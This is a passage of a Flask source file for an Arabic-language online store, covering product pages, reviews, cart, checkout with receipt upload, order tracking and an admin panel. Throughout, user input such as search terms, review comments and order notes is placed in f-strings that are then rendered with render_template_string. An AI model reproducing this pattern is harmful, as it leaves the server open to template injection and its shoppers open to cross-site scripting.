                    <img src="/static/uploads/{p["img"]}" onerror="this.src='data:image/svg+xml,<svg xmlns=%22http://www.w3.org/2000/svg%22 width=%22100%22 height=%22100%22><rect fill=%22%23e8f5e9%22 width=%22100%22 height=%22100%22/></svg>'">
                    <div class="card-badge">⭐ جديد</div>
                </div>
                <div class="card-body">
                    <div class="product-title">{p["name"]}</div>
                    <div style="margin-bottom: 8px;">{shipping_html}</div>
                    <div class="price">{p["price"]:.3f} <span class="price-currency">OMR</span></div>
                    <a href="/product/{p["id"]}" class="btn btn-primary btn-block">التفاصيل</a>
                </div>
            </div>
            '''
    else:
        if search:
            html_prods = f'<div class="empty-state"><div class="empty-state-icon">🔍</div><h3>لا توجد نتائج لـ "{search}"</h3><a href="/" class="btn btn-primary" style="margin-top: 16px;">عرض الكل</a></div>'
        else:
            html_prods = '<div class="empty-state"><div class="empty-state-icon">📭</div><h3>لا توجد منتجات</h3></div>'
    
    user_type = 'أدمن' if session.get('is_admin') else 'عميل'
    
    return render_template_string(render_page('الرئيسية', f"""
    <header>
        <div class="logo">THAWANI</div>
        <div class="user-info">{session['user'].split('@')[0]} | سلة: {cart_count} | {user_type}</div>
    </header>
    {search_html}
    <div class="cat-bar">
        <a href="/" class="cat-item {'active' if cat=='الكل' and not search else ''}">الكل</a>
        {html_cats}
    </div>
    <div class="container">
        {html_prods}
    </div>
    """, active_tab='home'))

@app.route('/profile')
@login_required
def profile():
    """✨ صفحة حسابي الجديدة"""
    conn = get_db()
    
    # جلب معلومات المستخدم
    user = conn.execute("SELECT * FROM users WHERE email=?", (session['user'],)).fetchone()
    
    # جلب عدد الطلبات
    orders_count = conn.execute("SELECT COUNT(*) FROM orders WHERE user_email=?", (session['user'],)).fetchone()[0]
    
    # جلب عدد منتجات السلة
    cart_count = conn.execute("SELECT SUM(quantity) FROM cart WHERE user_email=?", (session['user'],)).fetchone()[0] or 0
    
    # جلب آخر 3 طلبات
    recent_orders = conn.execute(
        "SELECT * FROM orders WHERE user_email=? ORDER BY id DESC LIMIT 3", 
        (session['user'],)
    ).fetchall()
    
    # جلب منتجات السلة
    cart_items = conn.execute('''
        SELECT p.name, p.price, p.img, c.quantity 
        FROM cart c 
        JOIN products p ON c.product_id=p.id 
        WHERE c.user_email=?
    ''', (session['user'],)).fetchall()
    
    conn.close()
    
    # بناء HTML الطلبات الأخيرة
    orders_html = ''
    if recent_orders:
        for o in recent_orders:
            status_icon = '⏳' if o['status'] == 'pending' else '✅' if o['status'] == 'approved' else '❌'
            orders_html += f'''
            <div style="display: flex; justify-content: space-between; align-items: center; padding: 12px; background: var(--bg); border-radius: var(--radius-sm); margin-bottom: 8px;">
                <div>
                    <div style="font-weight: 800; font-size: 13px;">طلب #{o['id']}</div>
                    <div style="font-size: 11px; color: var(--text-muted);">{o['created_at'][:10]}</div>
                </div>
                <div style="display: flex; align-items: center; gap: 8px;">
                    <span style="font-weight: 800; color: var(--primary);">{o['total_price']:.3f}</span>
                    <span>{status_icon}</span>
                </div>
            </div>
            '''
    else:
        orders_html = '<div style="text-align: center; padding: 20px; color: var(--text-muted); font-size: 13px;">لا توجد طلبات</div>'
    
    # بناء HTML السلة
    cart_html = ''
    if cart_items:
        for item in cart_items:
            cart_html += f'''
            <div style="display: flex; gap: 10px; align-items: center; padding: 10px; background: var(--bg); border-radius: var(--radius-sm); margin-bottom: 8px;">
                <img src="/static/uploads/{item['img']}" style="width: 40px; height: 40px; object-fit: cover; border-radius: 6px;">
                <div style="flex: 1;">
                    <div style="font-weight: 700; font-size: 12px;">{item['name'][:20]}...</div>
                    <div style="font-size: 11px; color: var(--primary); font-weight: 800;">{item['price']:.3f} × {item['quantity']}</div>
                </div>
            </div>
            '''
        cart_html += f'<a href="/cart" class="btn btn-primary btn-block" style="margin-top: 10px; padding: 10px; font-size: 13px;">عرض السلة الكاملة</a>'
    else:
        cart_html = '<div style="text-align: center; padding: 20px; color: var(--text-muted); font-size: 13px;">السلة فارغة</div>'
    
    return render_template_string(render_page('حسابي', f"""
    <div class="profile-header">
        <div class="profile-avatar">👤</div>
        <div class="profile-name">{session['user'].split('@')[0]}</div>
        <div class="profile-email">{session['user']}</div>
    </div>
    
    <div style="padding: 0 16px 20px;">
        <!-- معلومات الحساب -->
        <div class="profile-menu">
            <div style="padding: 12px 16px; border-bottom: 1px solid var(--border); font-weight: 800; color: var(--primary); font-size: 14px;">معلومات الحساب</div>
            <div class="profile-menu-item">
                <span class="profile-menu-icon">📧</span>
                <span>البريد الإلكتروني</span>
                <span style="margin-right: auto; font-size: 12px; color: var(--text-muted);">{session['user']}</span>
            </div>
            <div class="profile-menu-item">
                <span class="profile-menu-icon">🔑</span>
                <span>كلمة المرور</span>
                <span style="margin-right: auto; font-size: 12px; color: var(--text-muted);">********</span>
            </div>
            <div class="profile-menu-item">
                <span class="profile-menu-icon">👑</span>
                <span>نوع الحساب</span>
                <span style="margin-right: auto; font-size: 12px; color: var(--primary); font-weight: 800;">{'أدمن' if session.get('is_admin') else 'عميل'}</span>
            </div>
        </div>
        
        <!-- الطلبات -->
        <div class="profile-menu" style="margin-top: 16px;">
            <div style="padding: 12px 16px; border-bottom: 1px solid var(--border); font-weight: 800; color: var(--primary); font-size: 14px; display: flex; justify-content: space-between; align-items: center;">
                <span>طلباتي</span>
                <span class="profile-badge" style="background: var(--primary);">{orders_count}</span>
            </div>
            {orders_html}
            <a href="/orders" class="profile-menu-item" style="border-bottom: none; border-top: 1px solid var(--border); margin-top: 8px; color: var(--primary);">
                <span>عرض كل الطلبات</span>
                <span class="profile-menu-arrow">←</span>
            </a>
        </div>
        
        <!-- السلة -->
        <div class="profile-menu" style="margin-top: 16px;">
            <div style="padding: 12px 16px; border-bottom: 1px solid var(--border); font-weight: 800; color: var(--primary); font-size: 14px; display: flex; justify-content: space-between; align-items: center;">
                <span>سلة التسوق</span>
                <span class="profile-badge" style="background: var(--warning);">{cart_count}</span>
            </div>
            {cart_html}
        </div>
        
        <!-- الإشعارات -->
        <div class="profile-menu" style="margin-top: 16px;">
            <div style="padding: 12px 16px; border-bottom: 1px solid var(--border); font-weight: 800; color: var(--primary); font-size: 14px;">الإشعارات</div>
            <div class="profile-menu-item">
                <span class="profile-menu-icon">🔔</span>
                <span>الإشعارات</span>
                <span style="margin-right: auto; font-size: 12px; color: var(--text-muted);">لا توجد إشعارات جديدة</span>
            </div>
        </div>
    </div>
    
    <!-- زر الخروج -->
    <a href="/logout" class="logout-btn" style="text-decoration: none;">
        <span>🚪</span>
        <span>تسجيل الخروج</span>
    </a>
    """, active_tab='profile'))

@app.route('/product/<int:id>', methods=['GET', 'POST'])
@login_required
def product(id):
    conn = get_db()
    
    if request.method == 'POST':
        rating = int(request.form.get('rating', 5))
        comment = request.form.get('comment', '').strip()
        review_img = request.files.get('review_img')
        
        img_filename = None
        if review_img and review_img.filename:
            img_filename = save_upload(review_img)
        
        if comment:
            conn.execute(
                "INSERT INTO reviews (product_id, user_email, rating, comment, review_img) VALUES (?,?,?,?,?)",
                (id, session['user'], rating, comment, img_filename)
            )
            conn.commit()
        return redirect(f'/product/{id}')
    
    p = conn.execute("SELECT * FROM products WHERE id=?", (id,)).fetchone()
    revs = conn.execute("SELECT * FROM reviews WHERE product_id=? ORDER BY id DESC", (id,)).fetchall()
    conn.close()
    
    if p['shipping_type'] == 'free':
        shipping_html = '<span class="shipping-badge shipping-free" style="font-size: 12px; padding: 6px 12px;">🚚 شحن مجاني</span>'
    else:
        shipping_html = f'<span class="shipping-badge shipping-paid" style="font-size: 12px; padding: 6px 12px;">🚚 تكلفة الشحن: {p["shipping_price"]:.3f}</span>'
    
    html_revs = ''
    for r in revs:
        stars = '★' * r['rating'] + '☆' * (5 - r['rating'])
        img_html = ''
        if r['review_img']:
            img_html = f'<img src="/static/uploads/{r["review_img"]}" class="review-img" onclick="window.open(this.src)">'
        html_revs += f'''
        <div style="background:white; padding:16px; border-radius:var(--radius-md); margin-bottom:12px; border:1px solid var(--border);">
            <div style="display: flex; justify-content: space-between; align-items: center; margin-bottom: 10px;">
                <div style="color:var(--primary); font-size: 16px;">{stars}</div>
                <span style="font-size: 12px; color: var(--text-muted); font-weight: 700;">{r["user_email"][:15]}...</span>
            </div>
            <p style="font-size:14px; line-height: 1.6; color: var(--text);">{r["comment"]}</p>
            {img_html}
            <div style="color:var(--text-muted); font-size:11px; margin-top: 10px; font-weight: 700;">{r["created_at"][:16]}</div>
        </div>
        '''
    
    return render_template_string(render_page('المنتج', f"""
    <header><div class="logo">تفاصيل المنتج</div></header>
    <div style="padding: 16px; max-width: 600px; margin: 0 auto;">
        <div style="position: relative; margin-bottom: 20px; border-radius:var(--radius-lg); overflow:hidden; box-shadow: var(--shadow-md);">
            <img src="/static/uploads/{p['img']}" style="width:100%; display:block;">
            <div class="premium-badge" style="position: absolute; top: 12px; right: 12px;">⭐ مميز</div>
        </div>
        <h2 style="color:var(--primary); margin-bottom:12px; font-size: 24px; font-weight: 800;">{p['name']}</h2>
        <div style="margin-bottom: 16px;">{shipping_html}</div>
        <div class="price" style="font-size:28px; margin-bottom:16px; font-weight: 800;">{p['price']:.3f} <span style="font-size: 14px; color: var(--text-muted);">OMR</span></div>
        <p style="color:var(--text-light); margin-bottom:24px; line-height: 1.8; font-size: 15px;">{p['description'] or 'لا يوجد وصف'}</p>
        <a href="/add_to_cart/{p['id']}" class="btn btn-primary btn-block" style="padding: 14px; font-size: 16px;">أضف للسلة 🛒</a>
        
        <div style="margin-top: 32px;">
            <h3 style="margin-bottom: 16px; font-size: 18px; font-weight: 800; display: flex; align-items: center; gap: 8px;">
                <span>التقييمات</span>
                <span style="background: var(--primary); color: white; padding: 4px 10px; border-radius: 12px; font-size: 13px;">{len(revs)}</span>
            </h3>
            {html_revs}
            
            <form method="POST" enctype="multipart/form-data" style="margin-top: 20px; background: white; padding: 20px; border-radius: var(--radius-md); border: 1px solid var(--border);">
                <h4 style="margin-bottom: 16px; color: var(--primary); font-weight: 800;">✍️ أضف تقييمك</h4>
                <div class="form-group">
                    <select name="rating" class="form-control-modern" style="width: auto;">
                        <option value="5">⭐⭐⭐⭐⭐ (ممتاز)</option>
                        <option value="4">⭐⭐⭐⭐ (جيد جداً)</option>
                        <option value="3">⭐⭐⭐ (جيد)</option>
                        <option value="2">⭐⭐ (مقبول)</option>
                        <option value="1">⭐ (ضعيف)</option>
                    </select>
                </div>
                <div class="form-group">
                    <textarea name="comment" placeholder="اكتب رأيك في المنتج..." rows="3" required class="form-control-modern"></textarea>
                </div>
                <div class="form-group">
                    <label style="font-size: 13px; color: var(--text-muted); font-weight: 700;">📷 إرفاق صورة (اختياري)</label>
                    <input type="file" name="review_img" accept="image/*" class="form-control-modern" style="padding: 12px;">
                </div>
                <button class="btn btn-primary btn-block" style="padding: 12px;">نشر التقييم</button>
            </form>
        </div>
    </div>
    """))

@app.route('/add_to_cart/<int:id>')
@login_required
def add_to_cart(id):
    conn = get_db()
    item = conn.execute("SELECT id, quantity FROM cart WHERE user_email=? AND product_id=?", 
                       (session['user'], id)).fetchone()
    if item:
        conn.execute("UPDATE cart SET quantity=quantity+1 WHERE id=?", (item['id'],))
    else:
        conn.execute("INSERT INTO cart (user_email, product_id) VALUES (?,?)", (session['user'], id))
    conn.commit()
    conn.close()
    return redirect('/cart')

@app.route('/cart')
@login_required
def cart():
    conn = get_db()
    items = conn.execute('''
        SELECT p.id, p.name, p.price, p.img, p.shipping_type, p.shipping_price, c.quantity 
        FROM cart c JOIN products p ON c.product_id=p.id 
        WHERE c.user_email=?
    ''', (session['user'],)).fetchall()
    
    total = 0
    shipping_total = 0
    for i in items:
        total += i['price'] * i['quantity']
        if i['shipping_type'] == 'paid':
            shipping_total += i['shipping_price'] * i['quantity']
    
    conn.close()
    
    html_items = ''
    if items:
        for i in items:
            if i['shipping_type'] == 'free':
                shipping_text = '🚚 مجاني'
            else:
                shipping_text = f'🚚 {i["shipping_price"]:.3f}'
            html_items += f'''
            <div class="cart-item">
                <img src="/static/uploads/{i["img"]}">
                <div style="flex:1;">
                    <div style="font-weight:800; font-size:14px; margin-bottom: 4px;">{i["name"]}</div>
                    <div style="color:var(--primary); font-size:13px; font-weight: 700;">{i["price"]:.3f} × {i["quantity"]}</div>
                    <div style="font-size: 11px; color: var(--text-muted); margin-top: 4px; font-weight: 700;">{shipping_text}</div>
                </div>
                <div style="text-align:left;">
                    <div style="font-weight:800; font-size: 15px; color: var(--text); margin-bottom: 8px;">{(i["price"]*i["quantity"]):.3f}</div>
                    <a href="/remove_from_cart/{i["id"]}" class="btn btn-sm" style="color:var(--error); font-weight: 700; padding: 6px 12px;">🗑️</a>
                </div>
            </div>
            '''
        
        grand_total = total + shipping_total
        
        shipping_breakdown = ''
        if shipping_total > 0:
            shipping_breakdown = f'<div style="display:flex; justify-content:space-between; margin-bottom:12px; font-size: 14px; color: var(--text-muted); font-weight: 700;"><span>الشحن:</span><span>{shipping_total:.3f} OMR</span></div>'
        
        checkout_html = f'''
        <div style="background:white; padding:20px; border-radius:var(--radius-md); margin-top:20px; box-shadow: var(--shadow-sm); border: 1px solid var(--border);">
            <div style="display:flex; justify-content:space-between; margin-bottom:12px; font-size: 14px; font-weight: 700;">
                <span>المجموع:</span>
                <span>{total:.3f} OMR</span>
            </div>
            {shipping_breakdown}
            <div style="border-top:2px solid var(--border); margin-top:16px; padding-top:16px; display:flex; justify-content:space-between; align-items: center;">
                <span style="font-size: 16px; font-weight: 800;">الإجمالي:</span>
                <b style="color:var(--primary); font-size:24px; font-weight: 800;">{grand_total:.3f} <span style="font-size: 12px;">OMR</span></b>
            </div>
            <a href="/checkout" class="btn btn-primary btn-block" style="padding: 14px; font-size: 16px; margin-top: 16px;">إتمام الطلب ➡️</a>
        </div>
        '''
    else:
        html_items = '<div class="empty-state"><div class="empty-state-icon">🛒</div><h3>السلة فارغة</h3><a href="/" class="btn btn-primary" style="margin-top: 16px;">تصفح المنتجات</a></div>'
        checkout_html = ''
    
    return render_template_string(render_page('السلة', f"""
    <header><div class="logo">سلة التسوق</div></header>
    <div style="padding: 16px; max-width: 600px; margin: 0 auto;">
        {html_items}
        {checkout_html}
    </div>
    """, active_tab='cart'))

@app.route('/remove_from_cart/<int:pid>')
@login_required
def remove_from_cart(pid):
    conn = get_db()
    conn.execute("DELETE FROM cart WHERE user_email=? AND product_id=?", (session['user'], pid))
    conn.commit()
    conn.close()
    return redirect('/cart')

@app.route('/checkout', methods=['GET', 'POST'])
@login_required
def checkout():
    conn = get_db()
    items = conn.execute('''
        SELECT p.name, p.price, p.shipping_type, p.shipping_price, c.quantity 
        FROM cart c JOIN products p ON c.product_id=p.id 
        WHERE c.user_email=?
    ''', (session['user'],)).fetchall()
    
    if not items:
        conn.close()
        return redirect('/cart')
    
    total = 0
    shipping_total = 0
    for i in items:
        total += i['price'] * i['quantity']
        if i['shipping_type'] == 'paid':
            shipping_total += i['shipping_price'] * i['quantity']
    
    grand_total = total + shipping_total
    
    if request.method == 'POST':
        name = request.form.get('name', '').strip()
        phone = request.form.get('phone', '').strip()
        receipt = request.files.get('receipt')
        
        if not name or not phone or not receipt:
            flash('جميع الحقول مطلوبة', 'error')
        else:
            filename = save_upload(receipt)
            if filename:
                try:
                    details = ", ".join([f"{i['name']} (x{i['quantity']})" for i in items])
                    
                    cursor = conn.execute('''
                        INSERT INTO orders (user_email, full_name, phone, card_img, items_details, total_price, shipping_total)
                        VALUES (?, ?, ?, ?, ?, ?, ?)
                    ''', (session['user'], name, phone, filename, details, grand_total, shipping_total))
                    
                    order_id = cursor.lastrowid
                    conn.execute("DELETE FROM cart WHERE user_email=?", (session['user'],))
                    conn.commit()
                    conn.close()
                    
                    if 'flash_messages' not in session:
                        session['flash_messages'] = []
                    session['flash_messages'].append({
                        'text': f'✅ تم إنشاء طلبك #{order_id} بنجاح!',
                        'type': 'success'
                    })
                    session.modified = True
                    
                    return redirect(f'/order_success/{order_id}')
                    
                except Exception as e:
                    logger.error(f"Order error: {e}")
                    flash('خطأ في حفظ الطلب', 'error')
    
    conn.close()
    
    html_items = ''
    for i in items:
        item_shipping = 0 if i['shipping_type'] == 'free' else i['shipping_price'] * i['quantity']
        html_items += f'<div style="display:flex; justify-content:space-between; margin-bottom:10px; font-size:14px; padding: 8px 0; border-bottom: 1px solid var(--border);"><span style="font-weight: 700;">{i["name"]} <span style="color: var(--primary);">×{i["quantity"]}</span></span><span style="font-weight: 700;">{(i["price"]*i["quantity"]):.3f}</span></div>'
    
    shipping_breakdown = ''
    if shipping_total > 0:
        shipping_breakdown = f'<div style="display:flex; justify-content:space-between; margin-top:12px; padding-top:12px; border-top: 1px dashed var(--border);"><span style="font-size: 14px; color: var(--text-muted); font-weight: 700;">تكلفة الشحن:</span><span style="font-weight: 700; color: #e65100;">{shipping_total:.3f} OMR</span></div>'
    
    return render_template_string(render_page('إتمام الطلب', f"""
    <header><div class="logo">إتمام الطلب</div></header>
    <div style="padding: 16px; max-width: 500px; margin: 0 auto;">
        <div style="background:white; padding:20px; border-radius:var(--radius-md); margin-bottom:16px; box-shadow: var(--shadow-sm); border: 1px solid var(--border);">
            <h3 style="margin-bottom:16px; color:var(--primary); font-weight: 800; font-size: 18px;">📋 ملخص الطلب</h3>
            {html_items}
            {shipping_breakdown}
            <div style="border-top:2px solid var(--border); margin-top:16px; padding-top:16px; display:flex; justify-content:space-between; align-items: center;">
                <span style="font-weight: 800; font-size: 16px;">الإجمالي</span>
                <span style="color:var(--primary); font-size:24px; font-weight: 800;">{grand_total:.3f} <span style="font-size: 14px;">OMR</span></span>
            </div>
        </div>
        
        <form method="POST" enctype="multipart/form-data" style="background:white; padding:24px; border-radius:var(--radius-md); box-shadow: var(--shadow-sm); border: 1px solid var(--border);">
            <h3 style="margin-bottom: 20px; color: var(--primary); font-weight: 800; font-size: 18px;">📝 معلومات التوصيل</h3>
            <div class="form-group">
                <label>الاسم الكامل *</label>
                <input name="name" required placeholder="محمد أحمد" class="form-control-modern">
            </div>
            <div class="form-group">
                <label>رقم الهاتف *</label>
                <input name="phone" type="tel" required placeholder="+968 XXXX XXXX" class="form-control-modern">
            </div>
            <div class="form-group">
                <label>إيصال الدفع *</label>
                <input type="file" name="receipt" accept="image/*" required class="form-control-modern" style="padding:12px;">
                <p style="font-size: 12px; color: var(--text-muted); margin-top: 6px; font-weight: 700;">📸 صورة واضحة للتحويل البنكي</p>
            </div>
            <button type="submit" class="btn btn-primary btn-block" style="padding: 14px; font-size: 16px; margin-top: 10px;">✅ تأكيد الطلب</button>
        </form>
    </div>
    """))

@app.route('/order_success/<int:order_id>')
@login_required
def order_success(order_id):
    conn = get_db()
    order = conn.execute("SELECT * FROM orders WHERE id=? AND user_email=?", 
                        (order_id, session['user'])).fetchone()
    conn.close()
    
    if not order:
        return redirect('/orders')
    
    return render_template_string(render_page('تم بنجاح', f"""
    <div class="success-page">
        <div class="success-icon">🎉</div>
        <h1 class="success-title">تم إنشاء طلبك بنجاح!</h1>
        <p style="color: var(--text-muted); margin-bottom: 20px; font-size: 16px;">سنقوم بمراجعة طلبك والتواصل معك قريباً</p>
        <div style="background: white; padding: 24px; border-radius: var(--radius-md); margin: 0 auto 20px; max-width: 280px; box-shadow: var(--shadow-lg); border: 2px solid var(--border);">
            <div style="font-size: 14px; color: var(--text-muted); margin-bottom: 8px; font-weight: 700;">رقم الطلب</div>
            <div style="color:var(--primary); font-size: 36px; font-weight: 800;">#{order['id']}</div>
            <div style="margin-top: 12px; padding-top: 12px; border-top: 1px solid var(--border);">
                <div style="font-size: 13px; color: var(--text-muted); font-weight: 700;">المبلغ الإجمالي</div>
                <div style="color:var(--primary); font-size: 20px; font-weight: 800; margin-top: 4px;">{order['total_price']:.3f} OMR</div>
            </div>
        </div>
        <a href="/orders" class="btn btn-primary" style="padding: 14px 28px; font-size: 16px;">📦 متابعة الطلبات</a>
    </div>
    """, show_nav=True))

@app.route('/orders')
@login_required
def orders_history():
    conn = get_db()
    orders = conn.execute("SELECT * FROM orders WHERE user_email=? ORDER BY id DESC", 
                         (session['user'],)).fetchall()
    conn.close()
    
    html_orders = ''
    for o in orders:
        if o['status'] == 'pending':
            status_text = '⏳ قيد المراجعة'
            badge_class = 'badge-pending'
        elif o['status'] == 'approved':
            status_text = '✅ جاري التوصيل'
            badge_class = 'badge-approved'
        else:
            status_text = '❌ مرفوض'
            badge_class = 'badge-rejected'
        
        shipping_info = ''
        if o['shipping_total'] and o['shipping_total'] > 0:
            shipping_info = f'<div style="font-size: 12px; color: #e65100; margin-top: 4px; font-weight: 700;">🚚 شامل الشحن: {o["shipping_total"]:.3f}</div>'
        
        delivery_html = ''
        if o['status'] == 'approved' and o['accepted_at']:
            if o['delivered']:
                review_display = ''
                if o['delivery_review']:
                    review_display = f'<div style="background: rgba(255,255,255,0.25); padding: 12px; border-radius: var(--radius-sm); margin-top: 12px; font-size: 14px;"><strong>💬 تقييمك:</strong><br>{o["delivery_review"]}</div>'
                else:
                    review_display = f'''
                    <div class="review-delivery-form">
                        <h4 style="color: var(--primary); margin-bottom: 12px; font-weight: 800; font-size: 15px;">⭐ قيّم خدمة التوصيل</h4>
                        <form method="POST" action="/submit_delivery_review/{o["id"]}">
                            <textarea name="review" placeholder="مثال: الطلب وصلني بسرعة..." rows="3" required style="width: 100%; padding: 12px; border-radius: var(--radius-sm); border: 1px solid var(--border); margin-bottom: 10px; font-family: inherit;"></textarea>
                            <button type="submit" class="btn btn-primary btn-block" style="background: white; color: var(--primary); font-weight: 700;">إرسال التقييم ⭐</button>
                        </form>
                    </div>
                    '''
                delivery_html = f'''
                <div class="delivery-complete-box">
                    <div style="font-size: 48px; margin-bottom: 12px;">🎊</div>
                    <h3 style="margin-bottom: 10px; font-size: 20px; font-weight: 800;">تم وصول طلبك!</h3>
                    <p style="opacity: 0.95; margin-bottom: 12px; font-size: 14px;">نأمل أن تكون تجربتك معنا ممتازة</p>
                    {review_display}
                </div>
                '''
            else:
                delivery_html = f'''
                <div style="background: white; padding: 16px; border-radius: var(--radius-md); border: 2px solid var(--border); margin-top: 16px;">
                    <div style="display: flex; align-items: center; gap: 8px; margin-bottom: 12px; color: var(--primary); font-weight: 800; font-size: 15px;">
                        <span style="font-size: 20px;">🚚</span>
                        <span>حالة الشحنة</span>
                    </div>
                    <div class="delivery-track">
                        <div class="track-line" id="track-line-{o["id"]}" style="width: 0%;"></div>
                        <div class="delivery-truck truck-moving" id="truck-{o["id"]}" style="right: 8px;">🚛</div>
                    </div>
                    <div class="delivery-info" id="delivery-info-{o["id"]}">جاري حساب الوقت...</div>
                </div>
                <script>
                    (function() {{
                        const orderId = {o["id"]};
                        const acceptedAt = new Date("{o["accepted_at"]}");
                        const sevenDays = 7 * 24 * 60 * 60 * 1000;
                        
                        function updateDelivery() {{
                            const now = new Date();
                            const elapsed = now - acceptedAt;
                            const progress = Math.min((elapsed / sevenDays) * 100, 100);
                            
                            const truck = document.getElementById('truck-' + orderId);
                            const line = document.getElementById('track-line-' + orderId);
                            const info = document.getElementById('delivery-info-' + orderId);
                            
                            if (truck && line) {{
                                const rightPos = 100 - progress;
                                truck.style.right = rightPos + '%';
                                line.style.width = progress + '%';
                                
                                const daysLeft = Math.ceil((sevenDays - elapsed) / (24 * 60 * 60 * 1000));
                                const hoursLeft = Math.ceil(((sevenDays - elapsed) % (24 * 60 * 60 * 1000)) / (60 * 60 * 1000));
                                
                                if (progress >= 100) {{
                                    info.innerHTML = '<span style="color: var(--success);">🎉 وصلت الشاحنة!</span>';
                                    setTimeout(() => location.reload(), 2000);
                                }} else {{
                                    info.innerHTML = '⏱️ المتبقي: ' + daysLeft + ' يوم و ' + hoursLeft + ' ساعة';
                                }}
                            }}
                        }}
                        
                        updateDelivery();
                        setInterval(updateDelivery, 3600000);
                    }})();
                </script>
                '''
        
        notes_html = ''
        if o['notes'] and o['status'] != 'approved':
            notes_html = f'<div style="margin-top:12px; padding:12px; background:#fff3e0; border-radius:var(--radius-sm); font-size:13px; font-weight: 700;"><strong>📝 ملاحظة:</strong> {o["notes"]}</div>'
        
        html_orders += f'''
        <div class="order-card" id="order-{o["id"]}">
            <div class="order-header">
                <span class="order-id">طلب #{o["id"]}</span>
                <span class="badge {badge_class}">{status_text}</span>
            </div>
            <div style="color:var(--text-muted); font-size:12px; margin-bottom:12px; font-weight: 700;">📅 {o["created_at"][:16]}</div>
            <div style="background:var(--bg); padding:12px; border-radius:var(--radius-sm); margin:12px 0; font-size:13px; line-height: 1.8;">
                {o["items_details"]}
            </div>
            <div style="display:flex; justify-content:space-between; align-items:center;">
                <div>
                    <span style="color:var(--primary); font-weight:800; font-size:18px;">{o["total_price"]:.3f} <span style="font-size: 12px;">OMR</span></span>
                    {shipping_info}
                </div>
                <a href="/view_receipt/{o["id"]}" class="btn btn-outline btn-sm" style="font-weight: 700;">📄 الإيصال</a>
            </div>
            {delivery_html}
            {notes_html}
        </div>
        '''
    
    if not orders:
        html_orders = '<div class="empty-state"><div class="empty-state-icon">📦</div><h3>لا توجد طلبات</h3><a href="/" class="btn btn-primary" style="margin-top: 16px;">تصفح المنتجات</a></div>'
    
    return render_template_string(render_page('طلباتي', f"""
    <header><div class="logo">طلباتي</div></header>
    <div style="padding: 16px; max-width: 600px; margin: 0 auto;">
        {html_orders}
    </div>
    """, active_tab='orders'))

@app.route('/submit_delivery_review/<int:order_id>', methods=['POST'])
@login_required
def submit_delivery_review(order_id):
    review = request.form.get('review', '').strip()
    
    if not review:
        flash('الرجاء كتابة التقييم', 'error')
        return redirect('/orders')
    
    conn = get_db()
    
    order = conn.execute("SELECT * FROM orders WHERE id=? AND user_email=?", 
                        (order_id, session['user'])).fetchone()
    
    if not order:
        conn.close()
        abort(403)
    
    conn.execute("INSERT INTO delivery_reviews (order_id, user_email, review) VALUES (?,?,?)",
                (order_id, session['user'], review))
    
    conn.execute("UPDATE orders SET delivered=1, delivery_review=? WHERE id=?", 
                (review, order_id))
    
    conn.commit()
    conn.close()
    
    if 'flash_messages' not in session:
        session['flash_messages'] = []
    session['flash_messages'].append({
        'text': 'شكراً لتقييمك! 🌟',
        'type': 'success'
    })
    session.modified = True
    
    return redirect('/orders')

@app.route('/view_receipt/<int:order_id>')
@login_required
def view_receipt(order_id):
    conn = get_db()
    order = conn.execute("SELECT * FROM orders WHERE id=?", (order_id,)).fetchone()
    conn.close()
    
    if not order:
        abort(404)
    
    if order['user_email'] != session['user'] and not session.get('is_admin'):
        abort(403)
    
    return render_template_string(render_page('الإيصال', f"""
    <header><div class="logo">إيصال الدفع</div></header>
    <div style="padding: 16px; text-align: center;">
        <div style="background: white; padding: 24px; border-radius: var(--radius-md); box-shadow: var(--shadow-lg); border: 2px solid var(--border); max-width: 400px; margin: 0 auto;">
            <h3 style="margin-bottom: 20px; color: var(--primary); font-weight: 800; font-size: 20px;">طلب #{order_id}</h3>
            <img src="/static/uploads/{order['card_img']}" class="receipt-img" onclick="window.open(this.src, '_blank')" style="cursor: pointer; margin-bottom: 20px;">
            <a href="/orders" class="btn btn-outline" style="padding: 12px 24px; font-weight: 700;">⬅️ العودة للطلبات</a>
        </div>
    </div>
    """))

@app.route('/admin', methods=['GET', 'POST'])
@login_required
@admin_required
def admin():
    conn = get_db()
    
    if request.method == 'POST':
        action = request.form.get('action')
        
        if action == 'add_product':
            name = request.form.get('name', '').strip()
            price = request.form.get('price', type=float)
            cat = request.form.get('cat', '').strip()
            stock = request.form.get('stock', type=int, default=0)
            img = request.files.get('img')
            shipping_type = request.form.get('shipping_type', 'free')
            shipping_price = request.form.get('shipping_price', type=float, default=0)
            
            if shipping_type == 'free':
                shipping_price = 0
            
            if name and price and cat and img:
                filename = save_upload(img)
                if filename:
                    conn.execute('''
                        INSERT INTO products (name, price, img, category, description, stock, shipping_type, shipping_price)
                        VALUES (?, ?, ?, ?, ?, ?, ?, ?)
                    ''', (name, price, filename, cat, request.form.get('desc', ''), stock, shipping_type, shipping_price))
                    conn.commit()
                    if 'flash_messages' not in session:
                        session['flash_messages'] = []
                    session['flash_messages'].append({
                        'text': f'✅ تم إضافة المنتج "{name}" بنجاح!',
                        'type': 'success'
                    })
                    session.modified = True
        
        elif action == 'add_cat':
            name = request.form.get('cat_name', '').strip()
            if name:
                try:
                    conn.execute("INSERT INTO categories (name) VALUES (?)", (name,))
                    conn.commit()
                    if 'flash_messages' not in session:
                        session['flash_messages'] = []
                    session['flash_messages'].append({
                        'text': f'✅ تم إضافة الصنف "{name}" بنجاح!',
                        'type': 'success'
                    })
                    session.modified = True
                except:
                    if 'flash_messages' not in session:
                        session['flash_messages'] = []
                    session['flash_messages'].append({
                        'text': '❌ الصنف موجود مسبقاً!',
                        'type': 'error'
                    })
                    session.modified = True
        
        elif action == 'update_order':
            oid = request.form.get('order_id', type=int)
            status = request.form.get('status')
            notes = request.form.get('notes', '')
            if oid and status:
                if status == 'approved':
                    conn.execute("UPDATE orders SET status=?, notes=?, accepted_at=CURRENT_TIMESTAMP WHERE id=?", 
                                (status, notes, oid))
                else:
                    conn.execute("UPDATE orders SET status=?, notes=? WHERE id=?", (status, notes, oid))
                conn.commit()
                if 'flash_messages' not in session:
                    session['flash_messages'] = []
                session['flash_messages'].append({
                    'text': f'✅ تم تحديث حالة الطلب #{oid}!',
                    'type': 'success'
                })
                session.modified = True
        
        elif action == 'delete_product':
            pid = request.form.get('product_id', type=int)
            if pid:
                conn.execute("DELETE FROM products WHERE id=?", (pid,))
                conn.commit()
                if 'flash_messages' not in session:
                    session['flash_messages'] = []
                session['flash_messages'].append({
                    'text': '🗑️ تم حذف المنتج بنجاح!',
                    'type': 'warning'
                })
                session.modified = True
        
        return redirect('/admin')
    
    stats = {
